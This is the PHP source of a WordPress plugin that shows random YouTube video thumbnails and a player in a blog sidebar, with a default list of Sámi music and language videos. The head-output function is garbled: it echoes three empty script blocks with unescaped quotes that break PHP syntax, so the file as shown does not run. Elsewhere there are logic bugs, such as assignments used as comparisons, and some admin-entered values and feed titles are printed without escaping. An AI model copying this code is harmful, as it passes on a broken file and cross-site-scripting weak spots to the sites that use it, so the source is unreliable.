<?php
/*
Plugin Name: Daiko's YouTube Widget
Plugin URI: http://www.daikos.net/widgets/daikos-youtube-widget/
Description: Adds a sidebar widget to display random YouTube videos of your own choice. Make your own videolist in the widget-control-panel and/or add your favorite tag(s), user(s). Syntax: [YouTube ID]@[Title]<Line Brake>.
Author: Rune Fjellheim
Version: 1.2.6
License: GPL
Author URI: http://www.daikos.net
*/

//load_plugin_textdomain('daikos-youtube-widget');
//load_plugin_textdomain('daikosyoutubewidget', PLUGINDIR.'/'.dirname(plugin_basename(__FILE__)));

/*internationale*/
load_plugin_textdomain('daikosyoutubewidget', PLUGINDIR . '/daikos-youtube-widget/languages');

function daikosyoutubewidget_lang_init() {
	load_plugin_textdomain('daikosyoutubewidget', PLUGINDIR . '/daikos-youtube-widget/languages');
}
add_action('init', 'daikosyoutubewidget_lang_init' );

function widget_daikos_youtube_init() {
	
	if ( !function_exists('register_sidebar_widget') || !function_exists('register_widget_control') )
		return;

	function widget_daikos_youtube_control($number) {
		$options = $newoptions = get_option('widget_daikos_youtube');
		if ( $_POST["daikos-youtube-submit-$number"] ) {
			$newoptions[$number]['title'] = strip_tags(stripslashes($_POST["daikos-youtube-title-$number"]));
			$newoptions[$number]['count'] = strip_tags(stripslashes($_POST["daikos-youtube-count-$number"]));
			$newoptions[$number]['format'] = strip_tags(stripslashes($_POST["daikos-youtube-format-$number"]));
			$newoptions[$number]['content'] = strip_tags(stripslashes($_POST["daikos-youtube-content-$number"]));
			$newoptions[$number]['tags'] = strip_tags(stripslashes($_POST["daikos-youtube-tags-$number"]));
			$newoptions[$number]['users'] = strip_tags(stripslashes($_POST["daikos-youtube-users-$number"]));
			$newoptions[$number]['show'] = $_POST["daikos-youtube-show-$number"];
			$newoptions[$number]['slug'] = strip_tags(stripslashes($_POST["daikos-youtube-slug-$number"]));
		}
   		if ($options[$number]['count']=='') {
 			$newoptions[$number]['count'] = 4;
		}				
		if ( $options != $newoptions ) {
			$options = $newoptions;
			update_option('widget_daikos_youtube', $options);
		}
		$allSelected = $homeSelected = $postSelected = $postInCategorySelected = $pageSelected = $categorySelected = false;
		switch ($options[$number]['show']) {
			case "all":
			$allSelected = true;
			break;
			case "":
			$allSelected = true;
			break;
			case "home":
			$homeSelected = true;
			break;
			case "post":
			$postSelected = true;
			break;
			case "post_in_category":
			$postInCategorySelected = true;
			break;
			case "page":
			$pageSelected = true;
			break;
			case "category":
			$categorySelected = true;
			break;
		}
		$smallSelected = $mediumSelected = $largeSelected = false;
		switch ($options[$number]['format']) {
			case "small":
			$smallSelected = true;
			break;
			case "":
			$smallSelected = true;
			break;
			case "medium":
			$mediumSelected = true;
			break;
			case "large":
			$largeSelected = true;
			break;
		}
		    
	?>
		<label for="daikos-youtube-title-<?php echo "$number"; ?>" title='<?php echo __("Title above the widget","daikosyoutubewidget") ?>' style="line-height:35px;display:block;"><?php echo __("Title: ") ?> <input type="text" style="width: 470px;" id="daikos-youtube-title-<?php echo "$number"; ?>" name="daikos-youtube-title-<?php echo "$number"; ?>" value="<?php echo htmlspecialchars($options[$number]['title']); ?>" /></label>
		<label for="daikos-youtube-count-<?php echo "$number"; ?>" title='<?php echo __("Number of videos to show","daikosyoutubewidget") ?>' style="line-height:35px;"><?php echo __("How many videos to show: ","daikosyoutubewidget") ?><input type="integer" style="width: 80px;" id="daikos-youtube-count-<?php echo "$number"; ?>" name="daikos-youtube-count-<?php echo "$number"; ?>" value="<?php echo htmlspecialchars($options[$number]['count']); ?>" /></label>
		<label for="daikos-youtube-format-<?php echo "$number"; ?>"  title='<?php echo __("Size of the thumbnails.","daikosyoutubewidget","daikosyoutubewidget") ?>' style="line-height:35px;"><?php echo __("Format: ","daikosyoutubewidget") ?><select name="daikos-youtube-format-<?php echo "$number"; ?>" id="daikos-youtube-format-<?php echo "$number"; ?>"><option label="Small" value="small" <?php if ($smallSelected){echo "selected";} ?>><?php echo __("Small","daikosyoutubewidget") ?></option><option label="Medium" value="medium" <?php if ($mediumSelected){echo "selected";} ?>><?php echo __("Medium","daikosyoutubewidget") ?></option><option label="Large" value="large" <?php if ($largeSelected){echo "selected";} ?>><?php echo __("Large","daikosyoutubewidget") ?></option></select> </label>
		<label for="daikos-youtube-content-<?php echo "$number"; ?>" title='<?php echo __("IMPORTANT: No line brake (new line) after the last video!","daikosyoutubewidget") ?>' style="width: 495px; height: 280px;display:block;"><?php echo __("Videos","daikosyoutubewidget")." [YouTubeID]@[TITLE]{Line brake}" ?><textarea style="width: 470px; height: 240px;" id="daikos-youtube-content-<?php echo "$number"; ?>" name="daikos-youtube-content-<?php echo "$number"; ?>"><?php echo htmlspecialchars($options[$number]['content']); ?></textarea></label>
		<label for="daikos-youtube-tags-<?php echo "$number"; ?>" title='<?php echo __("YouTube tag(s), separated by ,","daikosyoutubewidget") ?>' style="line-height:35px;display:block;"><?php echo __("Feed from YouTube tag(s), separated by ,  : ","daikosyoutubewidget") ?><input type="text" style="width: 202px;" id="daikos-youtube-tags-<?php echo "$number"; ?>" name="daikos-youtube-tags-<?php echo "$number"; ?>" value="<?php echo htmlspecialchars($options[$number]['tags']); ?>" /></label>
		<label for="daikos-youtube-users-<?php echo "$number"; ?>" title='<?php echo __("YouTube user(s), separated by ,","daikosyoutubewidget") ?>' style="line-height:35px;display:block;"><?php echo __("Feed from YouTube user(s), separated by ,: ","daikosyoutubewidget") ?><input type="text" style="width: 202px;" id="daikos-youtube-users-<?php echo "$number"; ?>" name="daikos-youtube-users-<?php echo "$number"; ?>" value="<?php echo htmlspecialchars($options[$number]['users']); ?>" /></label>
		<label for="daikos-youtube-show-<?php echo "$number"; ?>"  title='<?php echo __("Show only on specified page(s)/post(s)/category. Default is All","daikosyoutubewidget") ?>' style="line-height:35px;"><?php echo __("Display only on: ","daikosyoutubewidget") ?><select name="daikos-youtube-show-<?php echo"$number"; ?>" id="daikos-youtube-show-<?php echo"$number"; ?>"><option label="All" value="all" <?php if ($allSelected){echo "selected";} ?>><?php echo __("All","daikosyoutubewidget") ?></option><option label="Home" value="home" <?php if ($homeSelected){echo "selected";} ?>><?php echo __("Home","daikosyoutubewidget") ?></option><option label="Post" value="post" <?php if ($postSelected){echo "selected";} ?>><?php echo __("Post(s)","daikosyoutubewidget") ?></option><option label="Post in Category ID(s)" value="post_in_category" <?php if ($postInCategorySelected){echo "selected";} ?>><?php echo __("Post In Category ID(s)","daikosyoutubewidget") ?></option><option label="Page" value="page" <?php if ($pageSelected){echo "selected";} ?>><?php echo __("Page(s)","daikosyoutubewidget") ?></option><option label="Category" value="category" <?php if ($categorySelected){echo "selected";} ?>><?php echo __("Category","daikosyoutubewidget") ?></option></select></label> 
		<label for="daikos-youtube-slug-<?php echo "$number"; ?>"  title='<?php echo __("Limit to specific page, post or category. Use ID, slug or title.","daikosyoutubewidget") ?>' style="line-height:35px;"><?php echo __("Slug/Title/ID: ","daikosyoutubewidget") ?><input type="text" style="width: 130px;" id="daikos-youtube-slug-<?php echo "$number"; ?>" name="daikos-youtube-slug-<?php echo "$number"; ?>" value="<?php echo htmlspecialchars($options[$number]['slug']); ?>" /></label>
		<?php if ($postInCategorySelected) echo "<p>".__("In Post In Category, add one or more cat ID(s)/name(s) comma separated!","daikosyoutubewidget")."</p>" ?>
		<label for="daikos-youtube-help" title='<?php echo __("You can get more help and instructions on www.daikos.net!","daikosyoutubewidget") ?>' style="line-height:25px;display:block;"><a href="http://www.daikos.net/widgets/daikos-youtube-widget/"><?php echo __("Help") ?></a></label>
		<input type="hidden" name="daikos-youtube-submit-<?php echo "$number"; ?>" id="daikos-youtube-submit-<?php echo "$number"; ?>" value="1" />
	<?php
	}

	function widget_daikos_youtube($args, $number = 1) {
		$dytwVersion = "Daiko's YouTube Widget v. 1.2.6";
		extract($args);
		$options = get_option('widget_daikos_youtube');
		$videoplayeroptions = get_option('widget_daikos_videoplayer');
		
		$title = $options[$number]['title'];
		$tags = str_replace(" ", "", $options[$number]['tags']);
		$tags = explode(",", $tags);
		$users = str_replace(" ", "", $options[$number]['users']);
		$users = explode(",", $users);

  		include_once (ABSPATH . WPINC . '/rss.php');
		$maxitems = 10;

		if (!empty($tags)) {
			foreach ($tags as $tag) {
				$feed = fetch_rss("http://www.youtube.com/rss/tag/".$tag.".rss");
				$items = array_slice($feed->items, 0, $maxitems);				
				foreach ($items as $item) {
					$item['link'] = str_replace("http://youtube.com/?v=", "", $item['link']);
					if ($videos ='') {
						$videofeed = $videofeed.$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
					else {
						$videofeed = $videofeed."\n".$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
				} 
			}
			
		}
		if (!empty($users)) {
			foreach ($users as $user) {
				$feed = fetch_rss("http://www.youtube.com/rss/user/".$user."/videos.rss");
				$items = array_slice($feed->items, 0, $maxitems);
				foreach ($items as $item) {
					$item['link'] = str_replace("http://youtube.com/?v=", "", $item['link']);
					if ($videos ='') {
						$videofeed = $videofeed.$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
					else {
						$videofeed = $videofeed."\n".$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}

				} 
			}

		}
		if ($options[$number]['content']!='' ||  !empty($videos)) {
			$videos = $videos."\n".$options[$number]['content'];
		}
		else {
			$videos = 'FBSvtnCr8Wc@Transjoik - Gievrie
dF0kMBTwDrM@Transjoik - Mustai Amaia
vkG7psgdl1o@Sámigiella - an Arctic nature language - The Sami language
5OJPwCXsKFI@Radio and TV give vitality to the language - Electronic media
6AwZrJfyW5M@Master in our own house - The Finnmark Act
NzupjHuvACk@Yoik\'n Roll - Yoik/music
yCz-7Gnp1_M@Mun ja mun
zbeEEU_X_B0@Slincraze and Aimen with saami rap
t_xQN6s_COw@Sofia ja Anna - Du Calmmit (your eyes)
5eveNk3o1ME@VAJAS - Sparrow of the wind';
		}
		$videos = explode("\n", $videos);										// First we make an array of the videolist 
		foreach($videos as $key => $value) {                                    // Take out empty videos
			if (strlen($value) < 10) $value = "";
			if($value == "" || $value == " " || is_null($value)) {
				unset($videos[$key]);
			}
		}                               
		$videos = array_unique($videos);                                        // Take out duplicates
		$videos = array_values($videos);                                        // Reorder the array
		$count = $options[$number]['count'];                                    // Count the videos available
		$countvideos = count($videos);
		
		if ($count>$countvideos){$count=$countvideos;}							// Prevent user from trying to show more videos than are available
		$random = array_rand($videos, $count);                                  // Pick a random selection of videos
		if ($count==1) {														// There is only one video to show so no need to treat it like an array
			$video = $videos[$random];
			$temp = explode("@", $video);
			$mediaID = $temp[0];
			$videotitle = preg_replace('/"/', '', $temp[1]);
		}
		else {
			for ($num=0; $num<$count; ++$num)  {								// Go through the list and establish the mediaID and title arrays
            	$video[$num] = $videos[$random[$num]];
				$temp = explode("@", $video[$num]);
				$mediaID[$num] = $temp[0];
				$videotitle[$num] = preg_replace('/"/', '', $temp[1]);
        	}
		}
		$show = $options[$number]['show'];                                      // Get the setting on where to show the widget
		$slug = $options[$number]['slug'];                                      // Optional Slug/Title/PageID on where to show it
		$showvideoplayer = $videoplayeroptions['show'];                         // Check the VideoPlayer Show and Slug
		$slugvideoplayer = $videoplayeroptions['slug'];
		$showplayer = false;
		
   		switch ($showvideoplayer) {                                             // Determine whether to use ThickBox or Daiko's VideoPlayer
				case "all": 
					$showplayer = true;
					break;
				case "home":
				if (is_home()) {
 					$showplayer = true;
		  		}
				break;
				case "post":
				if (is_single($slugvideoplayer)) {
					$showplayer = true;
		  		}
				break;
				case "post_in_category":
					$PiC = explode(",",$slugvideoplayer);
					$InCategory = false;
					foreach($PiC as $CategoryID) {
						if(is_single() && in_category($CategoryID)){
							$InCategory = true;
						}
						elseif (is_category($CategoryID)) {
							$InCategory = true;
						}
					}
				    if ($InCategory) {
	 					$showplayer = true;
					}
				break;
				case "page":
				if (is_page($slugvideoplayer)) {
					$showplayer = true;
		  		}
				break;
				case "category":
				if (is_category($slugvideoplayer)) {
					$showplayer = true;
		  		}
				break;
								
			}		
		
		$format = $options[$number]['format'];                                  // What format to show the thumbnail images in
		if (is_active_widget('widget_daikos_videoplayer') && $showplayer) {
			$width = $videoplayeroptions['width'];                              // Format to play the video in
			if (empty($width)) $width = 200;
			$height = round($width*0.836);
			if ($count==1) {
				$fulltext = $fulltext.'<div class="DYTWWrapperOuter'.$format.'"><div class="DYTWWrapperInner'.$format.'"><a onclick="var so = new SWFObject(\'http://www.youtube.com/v/'.$mediaID.'&amp;autoplay=1\', \'DYTW1\', \''.$width.'\', \''.$height.'\', \'8\', \'#336699\');so.addParam(\'wmode\', \'transparent\');'.$addParameter.' so.write(\'BigPlayer2\');" href="#BigPlayer2"><img style="background:url(http://img.youtube.com/vi/'.$mediaID.'/default.jpg);background-position: center center" src="'.get_bloginfo("url").'/wp-content/plugins/daikos-youtube-widget/play.gif" alt="'.$videotitle.'" title="'.$videotitle.'" /></a></div></div>'; 				
			}
			else {
				for ($i=0; $i<$count ;++$i) {
					$fulltext = $fulltext.'<div class="DYTWWrapperOuter'.$format.'"><div class="DYTWWrapperInner'.$format.'"><a onclick="var so = new SWFObject(\'http://www.youtube.com/v/'.$mediaID[$i].'&amp;autoplay=1\', \'DYTW'.$i.'\', \''.$width.'\', \''.$height.'\', \'8\', \'#336699\');so.addParam(\'wmode\', \'transparent\');'.$addParameter.' so.write(\'BigPlayer2\');" href="#BigPlayer2"><img style="background:url(http://img.youtube.com/vi/'.$mediaID[$i].'/default.jpg);background-position: center center" src="'.get_bloginfo("url").'/wp-content/plugins/daikos-youtube-widget/play.gif" alt="'.$videotitle[$i].'" title="'.$videotitle[$i].'" /></a></div></div>'; 
				}
			}
			$fulltext = '<div class="DYTWContainer">'.$fulltext.'<div class="DYTWcredits"><a href="http://www.daikos.net" title="'.$dytwVersion.'">YouTube Widget by Daiko</a></div></div>';
		} 
		elseif (function_exists('daikos_thickbox'))  {
			$width = 500;
			$height = round($width*0.825);
			if ($count==1) {
				$fulltext = $fulltext.'<div class="DYTWWrapperOuter'.$format.'"><div class="DYTWWrapperInner'.$format.'"><a onclick="var so = new SWFObject(\'http://www.youtube.com/v/'.$mediaID.'&amp;autoplay=1\', \'DYTW1\', \'100%\', \'98%\', \'8\', \'#336699\');so.addParam(\'wmode\', \'transparent\');'.$addParameter.' so.write(\'flashcontent\');" href="#TB_inline?height='.$height.'&amp;width='.$width.'&amp;inlineId=flashcontent" class="thickbox"><img style="background:url(http://img.youtube.com/vi/'.$mediaID.'/default.jpg);background-position: center center" src="'.get_bloginfo("url").'/wp-content/plugins/daikos-youtube-widget/play.gif" alt="'.$videotitle.'" title="'.$videotitle.'" /></a></div></div>'; 				
			}
			else {
				for ($i=0; $i<$count ;++$i) {
					$fulltext = $fulltext.'<div class="DYTWWrapperOuter'.$format.'"><div class="DYTWWrapperInner'.$format.'"><a onclick="var so = new SWFObject(\'http://www.youtube.com/v/'.$mediaID[$i].'&amp;autoplay=1\', \'DYTW'.$i.'\', \'100%\', \'98%\', \'8\', \'#336699\');so.addParam(\'wmode\', \'transparent\');'.$addParameter.' so.write(\'flashcontent\');" href="#TB_inline?height='.$height.'&amp;width='.$width.'&amp;inlineId=flashcontent" class="thickbox"><img style="background:url(http://img.youtube.com/vi/'.$mediaID[$i].'/default.jpg);background-position: center center" src="'.get_bloginfo("url").'/wp-content/plugins/daikos-youtube-widget/play.gif" alt="'.$videotitle[$i].'" title="'.$videotitle[$i].'" /></a></div></div>'; 
				}				
			}
			$fulltext = '<div class="DYTWContainer">'.$fulltext.'<div class="DYTWcredits"><a href="http://www.daikos.net" title="'.$dytwVersion.'">YouTube Widget by Daiko</a></div></div>';
		}
		else {
		   	$fulltext = __("Activate Daiko's ThickBox Plugin or place Daiko's VideoPlayer Widget!","daikosyoutubewidget"); 
		}
		
/* And do the widget dance! */
 
/* Do the conditional tag checks. */
		$disabled_text_dytw = __("Daiko's YouTube Widget is disabled for this page/post!","daikosyoutubewidget");
   		switch ($show) {
				case "all": 
					echo $before_widget; 
					echo "<div class='DaikosYouTube'>"; 
					$title ? print($before_title . $title . $after_title) : null;
                	echo $fulltext;
		            echo "</div>"; 
					echo $after_widget."
					";
					break;
				case "home":
				if (is_home()) {
					echo $before_widget; 
					echo "<div class='DaikosYouTube'>"; 
					$title ? print($before_title . $title . $after_title) : null;
                	echo $fulltext;
		            echo "</div>"; 
					echo $after_widget."
					";
		  		}
          		else {
            		echo "<!-- DYTW ".$number.$disabled_text_dytw." -->";
          		}
				break;
				case "post":
				if (is_single($slug)) {
					echo $before_widget; 
					echo "<div class='DaikosYouTube'>"; 
					$title ? print($before_title . $title . $after_title) : null;
                	echo $fulltext;
		            echo "</div>"; 
					echo $after_widget."
					";
		  		}
          		else {
            		echo "<!-- DYTW ".$number.$disabled_text_dytw." -->";
          		}
				break;
				case "post_in_category":
					$PiC = explode(",",$slug);
					$InCategory = false;
					foreach($PiC as $CategoryID) {
						if(is_single() && in_category($CategoryID)){
							$InCategory = true;
						}
						elseif (is_category($CategoryID)) {
							$InCategory = true;
						}
					}
				    if ($InCategory) {
						echo $before_widget; 
						echo "<div class='DaikosYouTube'>"; 
						$title ? print($before_title . $title . $after_title) : null;
	                	echo $fulltext;
			            echo "</div>"; 
						echo $after_widget."
						";
					}
					else {
				        echo "<!-- DYTW ".$number.$disabled_text_dytw." -->";
				    }
					break;
				case "page":
				if (is_page($slug)) {
					echo $before_widget; 
					echo "<div class='DaikosYouTube'>"; 
					$title ? print($before_title . $title . $after_title) : null;
                	echo $fulltext;
		            echo "</div>"; 
					echo $after_widget."
					";
		  		}
          		else {
            		echo "<!-- DYTW ".$number.$disabled_text_dytw." -->";
          		}
				break;
				case "category":
				if (is_category($slug)) {
					echo $before_widget; 
					echo "<div class='DaikosYouTube'>"; 
					$title ? print($before_title . $title . $after_title) : null;
                	echo $fulltext;
		            echo "</div>"; 
					echo $after_widget."
					";
		  		}
          		else {
            		echo "<!-- DYTW ".$number.$disabled_text_dytw." -->";
          		}
				break;
								
			}
			
	}

	function widget_daikos_youtube_setup() {
		$options = $newoptions = get_option('widget_daikos_youtube');
		if ( isset($_POST['daikos-youtube-number-submit']) ) {
			$number = (int) $_POST['daikos-youtube-number'];
			if ( $number > 9 ) $number = 9;
			if ( $number < 1 ) $number = 1;
			$newoptions['number'] = $number;
		}
		if ( $options != $newoptions ) {
			$options = $newoptions;
			update_option('widget_daikos_youtube', $options);
			widget_daikos_youtube_register($options['number']);
		}
	}
	
	function widget_daikos_youtube_page() {
		$options = $newoptions = get_option('widget_daikos_youtube');
	?>
		<div class="wrap">
			<form method="POST">
				<h2><?php _e("Daiko's YouTube Widgets" ,"daikosyoutubewidget"); ?></h2>
				<p style="line-height: 30px;"><?php _e("How many YouTube widgets would you like?" ,"daikosyoutubewidget"); ?>
				<select id="daikos-youtube-number" name="daikos-youtube-number" value="<?php echo $options['number']; ?>">
	<?php for ( $i = 1; $i < 10; ++$i ) echo "<option value='$i' ".($options['number']==$i ? "selected='selected'" : '').">$i</option>"; ?>
				</select>
				<span class="submit"><input type="submit" name="daikos-youtube-number-submit" id="daikos-youtube-number-submit" value="<?php _e("Save","daikosyoutubewidget"); ?>" /></span></p>
			</form>
		</div>
	<?php
	} 
	
	function widget_daikos_youtube_head() {
   			$dytwpath = get_option('siteurl')."/wp-content/plugins/daikos-youtube-widget/";
			echo "<!-- ".__("This loads the required scripts for Daiko's YouTube Widget","daikosyoutubewidget")." -->";
			echo "<link rel='stylesheet' href='".$dytwpath."dytw.css' type='text/css' media='screen' />";
			echo "<script type='text/javascript' src='".$dytwpath."js/swfobject.js'></script><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script>";
			echo "<!-- ".__("End of script load Daiko's YouTube Widget.","daikosyoutubewidget")." -->";
	}
	
	function widget_daikos_youtube_footer(){
			echo "<!-- ".__("This is a container for the ThickBox player in Daiko's YouTube Widget","daikosyoutubewidget")." -->
";
			echo "<div id='BigPlayer' style='display: none;'>";
			echo "<div id='flashcontent'>";
			echo __("Loading....","daikosyoutubewidget")."</div></div>
			";
			echo "<!-- ".__("End of container","daikosyoutubewidget")." -->";
	}
	
	
	function widget_daikos_youtube_register() {
		$options = get_option('widget_daikos_youtube');
		$number = $options['number'];
		if ( $number < 1 ) $number = 1;
		if ( $number > 9 ) $number = 9;
		for ($i = 1; $i <= 9; $i++) {
			$name = array('Daiko\'s YouTube Widget %s', 'widgets', $i);
			register_sidebar_widget($name, $i <= $number ? 'widget_daikos_youtube' : /* unregister */ '', $i);
			register_widget_control($name, $i <= $number ? 'widget_daikos_youtube_control' : /* unregister */ '', 530, 525, $i);
		}
		add_action('sidebar_admin_setup', 'widget_daikos_youtube_setup');
		add_action('sidebar_admin_page', 'widget_daikos_youtube_page');
		if ( is_active_widget('widget_daikos_youtube') ) {
			add_action('wp_head', 'widget_daikos_youtube_head'); 
			add_action('wp_footer', 'widget_daikos_youtube_footer');
		}

	}
	
	
	add_action('init', 'widget_daikos_youtube_register', 5);
    
}
function widget_daikos_videoplayer_init() {

    if ( !function_exists('register_sidebar_widget') || !function_exists('register_widget_control') )
        return; 

	    function widget_daikos_videoplayer_control() {
	        $options = $newoptions = get_option('widget_daikos_videoplayer');

	        if ( $_POST['daikos-videoplayer-submit'] ) {
	            $newoptions['title'] = strip_tags(stripslashes($_POST["daikos-videoplayer-title"]));
				$newoptions['width'] = strip_tags(stripslashes($_POST["daikos-videoplayer-width"]));
				$newoptions['show'] = $_POST["daikos-videoplayer-show"];
				$newoptions['slug'] = strip_tags(stripslashes($_POST["daikos-videoplayer-slug"]));
	        }

	        if ( $options != $newoptions ) {
	            $options = $newoptions;
	            update_option('widget_daikos_videoplayer', $options);
	        }
			$allSelected = $homeSelected = $postSelected = $postInCategorySelected = $pageSelected = $categorySelected = false;
			switch ($options['show']) {
				case "all":
				$allSelected = true;
				break;
				case "":
				$allSelected = true;
				break;
				case "home":
				$homeSelected = true;
				break;
				case "post":
				$postSelected = true;
				break;
				case "post_in_category":
				$postInCategorySelected = true;
				break;
				case "page":
				$pageSelected = true;
				break;
				case "category":
				$categorySelected = true;
				break;
			}

	        $title = $options['title'];
	        $width = $options['width'];

	?>
	        <div>
	        <label for="daikos-videoplayer-title" style="line-height:35px;display:block;"><?php echo __("VideoPlayer title: ","daikosyoutubewidget") ?><input type="text" id="daikos-videoplayer-title" name="daikos-videoplayer-title" value="<?php echo $title; ?>" /></label>
	        <label for="daikos-videoplayer-width" style="line-height:35px;display:block;"><?php echo __("VideoPlayer width: ","daikosyoutubewidget") ?><input type="integer" id="daikos-videoplayer-width" name="daikos-videoplayer-width" value="<?php echo $width; ?>" /></label>
			<label for="daikos-videoplayer-show"  title='<?php echo __("Show only on specified page(s)/post(s)/category. Default is All","daikosyoutubewidget") ?>' style="line-height:35px;"><?php echo __("Display only on: ","daikosyoutubewidget") ?><select name="daikos-videoplayer-show" id="daikos-videoplayer-show"><option label="All" value="all" <?php if ($allSelected){echo "selected";} ?>><?php echo __("All","daikosyoutubewidget") ?></option><option label="Home" value="home" <?php if ($homeSelected){echo "selected";} ?>><?php echo __("Home","daikosyoutubewidget") ?></option><option label="Post" value="post" <?php if ($postSelected){echo "selected";} ?>><?php echo __("Post(s)","daikosyoutubewidget") ?></option><option label="Post in Category ID(s)" value="post_in_category" <?php if ($postInCategorySelected){echo "selected";} ?>><?php echo __("Post In Category ID(s)","daikosyoutubewidget") ?></option><option label="Page" value="page" <?php if ($pageSelected){echo "selected";} ?>><?php echo __("Page(s)","daikosyoutubewidget") ?></option><option label="Category" value="category" <?php if ($categorySelected){echo "selected";} ?>><?php echo __("Category","daikosyoutubewidget") ?></option></select></label> 
			<label for="daikos-videoplayer-slug"  title='<?php echo __("Limit to specific page, post or category. Use ID, slug or title.","daikosyoutubewidget") ?>' style="line-height:35px;"><?php echo __("Slug/Title/ID: ","daikosyoutubewidget") ?><input type="text" style="width: 130px;" id="daikos-videoplayer-slug" name="daikos-videoplayer-slug" value="<?php echo htmlspecialchars($options['slug']); ?>" /></label>
			<?php if ($postInCategorySelected) echo "<p>".__("In Post In Category, add one or more cat ID(s)/name(s) comma separated!","daikosyoutubewidget")."</p>" ?>
	        <input type="hidden" name="daikos-videoplayer-submit" id="daikos-videoplayer-submit" value="1" />
	        </div>
	    <?php
	    }

    function widget_daikos_videoplayer($args) {
        extract($args);
        $options = get_option('widget_daikos_videoplayer');
		$youtubeoptions = get_option('widget_daikos_youtube');
        $title = $options['title'];
        $width = $options['width'];
		$show = $options['show'];                                      			// Get the setting on where to show the widget
		$slug = $options['slug'];                                      			// Optional Slug/Title/PageID on where to show it
		if (empty($width)) $width = 200;
		$heigth = round($width*0.82352941);
        $number = 1;
		$tags = str_replace(" ", "", $youtubeoptions[$number]['tags']); 		
		$tags = explode(",", $tags);
		$users = str_replace(" ", "", $youtubeoptions[$number]['users']);
		$users = explode(",", $users);

  		include_once (ABSPATH . WPINC . '/rss.php');
		$maxitems = 10;

		if (!empty($tags)) {
			foreach ($tags as $tag) {
				$feed = fetch_rss("http://www.youtube.com/rss/tag/".$tag.".rss");
				$items = array_slice($feed->items, 0, $maxitems);
				foreach ($items as $item) {
					$item['link'] = str_replace("http://youtube.com/?v=", "", $item['link']);
					if ($videos ='') {
						$videofeed = $videofeed.$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
					else {
						$videofeed = $videofeed."\n".$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
				} 
			}
		}

		if (!empty($users)) {
			foreach ($users as $user) {
				$feed = fetch_rss("http://www.youtube.com/rss/user/".$user."/videos.rss");
				$items = array_slice($feed->items, 0, $maxitems);
				foreach ($items as $item) {
					$item['link'] = str_replace("http://youtube.com/?v=", "", $item['link']);
					if ($videos ='') {
						$videofeed = $videofeed.$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
					else {
						$videofeed = $videofeed."\n".$item['link']."@".$item['title'];
						$videos = $videos.$videofeed;
					}
                } 
			}
		}

		if ($youtubeoptions[$number]['content']!='' ||  !empty($videos)) {
			$videos = $videos.$youtubeoptions[$number]['content'];
		}
		else {
			$videos = 'FBSvtnCr8Wc@Transjoik - Gievrie
dF0kMBTwDrM@Transjoik - Mustai Amaia
vkG7psgdl1o@Sámigiella - an Arctic nature language - The Sami language
5OJPwCXsKFI@Radio and TV give vitality to the language - Electronic media
6AwZrJfyW5M@Master in our own house - The Finnmark Act
NzupjHuvACk@Yoik\'n Roll - Yoik/music
yCz-7Gnp1_M@Mun ja mun
zbeEEU_X_B0@Slincraze and Aimen with saami rap
t_xQN6s_COw@Sofia ja Anna - Du Calmmit (your eyes)
5eveNk3o1ME@VAJAS - Sparrow of the wind';
		}

		$videos = explode("\n", $videos);										// First we make an array of the videolist
		foreach($videos as $key => $value) {                                    // Take out empty videos
			if (strlen($value) < 10) $value = "";
			if($value == "" || $value == " " || is_null($value)) {
				unset($videos[$key]);
			}
		}                               
		$videos = array_unique($videos);                                        // Take out duplicates
		$videos = array_values($videos);                                        // Reorder the array
		$video = wptexturize( $videos[ mt_rand(0, count($videos) - 1 ) ] );
		$temp = explode("@", $video);
		$mediaID = $temp[0];
        $videocode = "<script type='text/javascript'>
var so = new SWFObject('http://www.youtube.com/v/".$mediaID."', 'DYTWBigPlayer', '".$width."', '".$heigth."', '8', '#336699');
so.addParam('wmode', 'transparent');
so.write('BigPlayer2');
</script>";
        $fulltext ="<!-- ".__("Container for the big video player in Daiko's YouTube Widget","daikosyoutubewidget")." -->
        <div id=\"BigPlayer2\">
		</div>
		".$videocode;
		
		/* Do the conditional tag checks. */
		$disabled_text = "<!-- ".__("Daiko's VideoPlayer is disabled for this page/post!","daikosyoutubewidget")." -->";
		   		switch ($show) {
						case "all": 
							echo $before_widget; 
							$title ? print($before_title . $title . $after_title) : null;
		                	echo $fulltext;
							echo "";
							echo $after_widget."
							"; 
							break;
						case "home":
						if (is_home()) {
							echo $before_widget; 
							$title ? print($before_title . $title . $after_title) : null;
		                	echo $fulltext;
							echo "";
							echo $after_widget."
							"; 
				  		}
		          		else {
		            		echo $disabled_text;
		          		}
						break;
						case "post":
						if (is_single($slug)) {
							echo $before_widget; 
							$title ? print($before_title . $title . $after_title) : null;
		                	echo $fulltext;
							echo "";
							echo $after_widget."
							"; 
				  		}
		          		else {
		            		echo $disabled_text;
		          		}
						break;
						case "post_in_category":
							$PiC = explode(",",$slug);
							$InCategory = false;
							foreach($PiC as $CategoryID) {
								if(is_single() && in_category($CategoryID)){
									$InCategory = true;
								}
								elseif (is_category($CategoryID)) {
									$InCategory = true;
								}
							}
						    if ($InCategory) {
								echo $before_widget; 
								$title ? print($before_title . $title . $after_title) : null;
			                	echo $fulltext;
								echo "";
								echo $after_widget."
								"; 
							}
							else {
						        echo $disabled_text;
						    }
							break;
						case "page":
						if (is_page($slug)) {
							echo $before_widget; 
							$title ? print($before_title . $title . $after_title) : null;
		                	echo $fulltext;
							echo "";
							echo $after_widget."
							"; 
				  		}
		          		else {
		            		echo $disabled_text;
		          		}
						break;
						case "category":
						if (is_category($slug)) {
							echo $before_widget; 
							$title ? print($before_title . $title . $after_title) : null;
		                	echo $fulltext;
							echo "";
							echo $after_widget."
							"; 
				  		}
		          		else {
		            		echo $disabled_text;
		          		}
						break;

					}
					
    }

    register_sidebar_widget('Daiko\'s VideoPlayer', 'widget_daikos_videoplayer');
    register_widget_control('Daiko\'s VideoPlayer', 'widget_daikos_videoplayer_control');
}
function daikosyoutubewidget_plugin_basename ($file) 
{
    $file = str_replace('\\','/',$file); // sanitize for Win32 installs
    $file = preg_replace('|/+|','/', $file); // remove any duplicate slash
    $file = preg_replace('|^.*/wp-content/plugins/|','',$file); // get relative path from plugins dir
    return $file;
}

